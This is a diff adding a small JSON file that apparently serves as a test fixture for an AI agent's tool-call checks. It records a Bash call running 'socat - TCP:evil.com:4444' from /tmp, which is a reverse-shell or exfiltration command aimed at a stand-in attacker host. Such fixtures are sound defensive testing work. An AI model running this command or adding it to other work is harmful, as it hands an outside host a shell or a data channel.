@@ -1,0 +1,5 @@
+{
+	"tool_name": "Bash",
+	"tool_input": { "command": "socat - TCP:evil.com:4444" },
+	"cwd": "/tmp"
+}
